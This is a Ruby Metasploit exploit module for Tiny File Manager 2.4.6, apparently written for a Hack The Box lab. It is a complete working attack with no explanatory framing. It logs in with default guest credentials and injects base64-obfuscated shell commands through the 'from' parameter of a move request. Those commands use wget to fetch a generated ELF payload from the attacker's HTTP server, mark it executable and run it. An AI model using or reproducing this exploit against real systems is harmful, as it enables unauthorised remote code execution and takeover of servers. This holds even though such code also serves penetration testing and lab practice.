require 'msf/core'
require 'base64'

class MetasploitModule < Msf::Exploit
    include Msf::Exploit::EXE
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer


    def initialize(info = {})
            super(update_info(info,
                'Name'           => 'Tiny File Manager RCE',
                'Description'    => %q{
                    Tiny File Manager 2.4.6 (HTB-version) Authenticated Remote Command Execution via command injection
                },
                'Author'         => [ 'japkettu' ],
                'License'        => 'No License',
	        'Platform'       => 'linux',
	        'Targets'        =>
        	  [
	            [ 'Automatic', {} ],
	          ],
	        'DefaultTarget'  => 0 ))
            register_options(
                [
                    OptString.new('WRITABLEDIR', [true, 'Path to writable directory on target', '/tmp/']),
                    OptString.new('Username', [true, 'Username', 'guest']),
                    OptString.new('Password', [true, 'Password', 'guest']),
                    OptString.new('FILENAME', [true, 'Payload filename', 'a.elf']),
                    OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '0.0.0.0']),
                    OptInt.new('SRVPORT', [true, 'HTTP Server Port', '8080']),
                    OptString.new('URIPATH', [true, 'URI', 'index.php'])
                ], self.class)
    end

    def primer
    end

    def check
        uri = "/"
        res = send_request_cgi({
            'method'   => 'GET',
            'uri'      => normalize_uri(uri, '/',datastore['URIPATH'])
        })

        rx = %r{<title>[\n\t\s]*(?<title>.+?)[\s\n\t]*</title>}im.match(res.body.to_s)
        unless rx
          vprint_error("No title found")
          return
        end
        
        rx[:title].strip!

        if res && res.code == 200 && rx[:title] == 'Tiny File Manager'
           Exploit::CheckCode::Vulnerable
        else
           Exploit::CheckCode::Safe
        end
    end

    def on_request_uri(cli, req)
            @pl = generate_payload_exe
    	    print_status("#{peer} - Payload request received: #{req.uri}")
            send_response(cli, @pl)
    	end

    def exploit

        user =  datastore['Username']
        password = datastore['Password']
        rhost = datastore['RHOST']
        rport = datastore['RPORT']
        srvport = datastore['SRVPORT']
        lhost = datastore['LHOST']
        filename = datastore['FILENAME']
        dir = datastore['WRITABLEDIR']

        start_service({'Uri' => {
          'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
          'Path' => "/#{filename}"
        }})

        print_status("Connecting to #{rhost}:#{rport}")
        print_status("Trying to login as #{user}:#{password}")


        res = send_request_cgi({
          'uri'    => normalize_uri(target_uri.path, '/'),
          'method' => 'POST',
          'vars_post'   => {
            'fm_usr' => user,
            'fm_pwd' => password,
          }
        })

        unless res && res.code != 404
          fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{password}")
        end

        unless [200, 301, 302].include?(res.code)
          fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{password}")
        end

        print_good("#{rhost}:#{rport} - Successful login #{user}:#{password}")


        @cookie = res.get_cookies
        unless @cookie.include?('filemanager')
          print_error('Error retrieving cookie!')
          fail_with(Failure::NoAccess)
        end
        print_good("Successfully retrieved session cookie: #{@cookie}")
        
        payload_1 = Base64.encode64("wget -q http://#{lhost}:#{srvport}/#{filename} &")
        payload_1 = payload_1.strip
        print_status("Generated base64 encoded payload: #{payload_1}")
        cmd_1 = "`bash<<<$(base64${IFS}-d<<<#{payload_1})`t" 
        
        print_status(cmd_1)

        payload_2 = Base64.encode64("chmod +x #{filename} && mv #{filename} #{dir}")
        payload_2 = payload_2.strip
        cmd_2= "`bash<<<$(base64${IFS}-d<<<#{payload_2})`t" 

        print_status("Generated base64 encoded payload: #{payload_2}")
        print_status(cmd_2)
        payload_3 = Base64.encode64("#{dir}#{filename}")
        payload_3 = payload_3.strip
        print_status("Generated base64-encoded payload: #{payload_3}")
        cmd_3 = "`bash<<<$(base64${IFS}-d<<<#{payload_3})`t" 
        print_status(cmd_3)
        

        res_cmd_1 = send_request_cgi({
          'uri'    => normalize_uri(target_uri.path, '/index.php'),
          'method' => 'GET',
          'cookie' => @cookie,
          'vars_get'   => {
            'to' => 'tmp',
            'from' => cmd_1,
            'finish' => 1,
            'move' => 1
          }
        })
        sleep(3)
        res_cmd_2 = send_request_cgi({
          'uri'    => normalize_uri(target_uri.path, '/index.php'),
          'method' => 'GET',
          'cookie' => @cookie,
          'vars_get'   => {
            'to' => 'tmp',
            'from' => cmd_2,
            'finish' => 1,
            'move' => 1
          }
        })

        sleep(3)

        print_status("Executing payload")
        res_cmd_3 = send_request_cgi({
          'uri'    => normalize_uri(target_uri.path, '/index.php'),
          'method' => 'GET',
          'cookie' => @cookie,
          'vars_get'   => {
            'to' => 'tmp',
            'from' => cmd_3,
            'finish' => 1,
            'move' => 1
          }
        })


        sleep(5)

    end


end
    
